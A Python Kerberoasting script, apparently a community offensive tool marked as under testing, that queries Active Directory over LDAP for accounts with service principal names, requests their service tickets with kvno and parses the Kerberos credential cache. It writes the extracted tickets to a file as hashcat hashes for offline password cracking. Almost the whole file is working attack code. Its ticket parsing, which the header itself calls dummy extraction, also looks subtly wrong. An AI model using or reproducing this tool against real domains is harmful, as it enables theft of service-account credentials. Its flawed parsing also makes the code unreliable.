########################################################################################################################################################################################
# Python (Linux) kerbroasting Script by: 41ph4-01 and our community. (Under testing)
# Installs krb5-user (provides kvno & klist) if missing, installs ldap3 and pyasn1 Python modules if missing. LDAP queries for users with SPNs,requests TGS tickets with kvno command, parses klist output for tickets and dummy hashextraction # writes hashes to file for Hashcat cracking.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
########################################################################################################################################################################################

# Banner
def print_banner():
    banner = r"""

 ____  __.            ___.                                        __  .__                                              _____  ______________  ___ ___    _____           _______  ____ 
|    |/ _|____ _______\_ |__   ____ _______  _________    _______/  |_|__| ____   ____    ______  ___.__.             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
|      <_/ __ \\_  __ \| __ \_/ __ \\_  __ \/  _ \__  \  /  ___/\   __\  |/    \ / ___\   \____ \<   |  |   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
|    |  \  ___/ |  | \/| \_\ \  ___/ |  | \(  <_> ) __ \_\___ \  |  | |  |   |  | /_/  >  |  |_> >\___  |  /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
|____|__ \___  >|__|   |___  /\___  >|__|   \____(____  /____  > |__| |__|___|  |___  /  /\   __/ / ____|           \____   | |___||____|    \___|_  /\____   |           \_____  /___|
        \/   \/            \/     \/                  \/     \/               \/_____/   \/__|    \/                     |__|                      \/      |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |

"""
    print(banner)
    print("Kerberoasting.py - 41PH4-01 & Our Community\n")


import os
import sys
import getpass
import subprocess
import time
import binascii
import struct

# LDAP
from ldap3 import Server, Connection, NTLM, ALL

# ASN.1
from pyasn1.codec.ber import decoder
from pyasn1_modules import rfc4120

# -------------------- CONFIG --------------------
LDAP_SERVER = 'ldap://your.ad.domain'
LDAP_SEARCH_BASE = 'dc=your,dc=ad,dc=domain'
# ------------------------------------------------

LDAP_USER = None
LDAP_PASS = None
DOMAIN = None


def install_deps():
    import importlib.util
    for module in ['ldap3', 'pyasn1', 'pyasn1_modules']:
        if importlib.util.find_spec(module) is None:
            print(f"[*] Installing Python module {module}")
            subprocess.run([sys.executable, '-m', 'pip', 'install', module])
    for bin in ['kvno', 'klist']:
        if not subprocess.run(['which', bin], capture_output=True).stdout:
            print(f"[*] Installing krb5-user tools")
            subprocess.run(['apt-get', 'update'])
            subprocess.run(['apt-get', 'install', '-y', 'krb5-user'])


def prompt_creds():
    global LDAP_USER, LDAP_PASS, DOMAIN
    LDAP_USER = input("Enter domain user (DOMAIN\\username): ")
    LDAP_PASS = getpass.getpass("Enter password: ")
    DOMAIN = LDAP_USER.split("\\")[0]


def get_spns():
    print("[*] Querying LDAP for SPNs")
    server = Server(LDAP_SERVER, get_info=ALL)
    conn = Connection(server, user=LDAP_USER, password=LDAP_PASS, authentication=NTLM, auto_bind=True)
    conn.search(LDAP_SEARCH_BASE, '(servicePrincipalName=*)', attributes=['sAMAccountName', 'servicePrincipalName'])
    return conn.entries


def request_tgs(spn):
    print(f"[*] Requesting TGS for {spn}")
    subprocess.run(['kvno', spn], check=False)


def get_ccache():
    cc = os.environ.get('KRB5CCNAME')
    if cc:
        return cc.replace('FILE:', '')
    uid = os.getuid()
    return f"/tmp/krb5cc_{uid}"


def parse_ccache(ccfile):
    # credit to impacket's ccache parser
    hashes = []
    with open(ccfile, 'rb') as f:
        data = f.read()

    if data[:2] != b'\x05\x04':
        print("[!] Unsupported ccache version")
        return []

    # skip header
    pos = 12
    count = struct.unpack('>I', data[pos:pos+4])[0]
    pos += 4

    for _ in range(count):
        # parse each credential
        start = pos
        #  Minimal parsing full parsing is in impacket for all fields
        #  Only need the ticket
        
        try:
            client_principal_len = struct.unpack('>I', data[pos+20:pos+24])[0]
            pos += 24 + client_principal_len
            server_principal_len = struct.unpack('>I', data[pos:pos+4])[0]
            pos += 4 + server_principal_len
            keyblock_len = struct.unpack('>I', data[pos:pos+4])[0]
            pos += 4 + keyblock_len
            times = 16*4
            pos += times
            is_skey = struct.unpack('>I', data[pos:pos+4])[0]
            pos += 4
            ticket_flags = struct.unpack('>I', data[pos:pos+4])[0]
            pos += 4
            ticket_len = struct.unpack('>I', data[pos:pos+4])[0]
            pos += 4
            ticket_data = data[pos:pos+ticket_len]
            pos += ticket_len
            # decode ticket ASN.1
            decoded, _ = decoder.decode(ticket_data, asn1Spec=rfc4120.Ticket())
            etype = decoded['enc-part']['etype']
            cipher = decoded['enc-part']['cipher']
            spn = str(decoded['sname']['name-string'][0])
            realm = str(decoded['realm'])
            user = str(decoded['sname']['name-string'][-1])

            # checksum typically first 16 of plaintext
            checksum = binascii.hexlify(cipher[:16]).decode()
            ciphertext = binascii.hexlify(cipher).decode()

            hashcat_fmt = f"$krb5tgs${etype}$*{user}*{realm.upper()}${spn}*{checksum}${ciphertext}"
            print(f"[+] Hash extracted: {hashcat_fmt[:60]}...")
            hashes.append(hashcat_fmt)
        except Exception as e:
            print(f"[-] Failed to parse one credential: {e}")
            continue
    return hashes


def main():
    install_deps()
    prompt_creds()
    spns = get_spns()
    if not spns:
        print("[-] No SPNs found")
        return
    for entry in spns:
        spnlist = entry['servicePrincipalName']
        for spn in spnlist:
            request_tgs(spn)
    time.sleep(5)
    ccfile = get_ccache()
    if not os.path.exists(ccfile):
        print(f"[-] ccache not found at {ccfile}")
        return
    hashes = parse_ccache(ccfile)
    if hashes:
        with open("kerberoast_hashes.txt", "w") as f:
            for h in hashes:
                f.write(h + "\n")
        print("[*] Hashes written to kerberoast_hashes.txt")
    else:
        print("[!] No hashes extracted.")


if __name__ == "__main__":
    main()



#Usage
# sudo python3 kerberoast_all_in_one.py

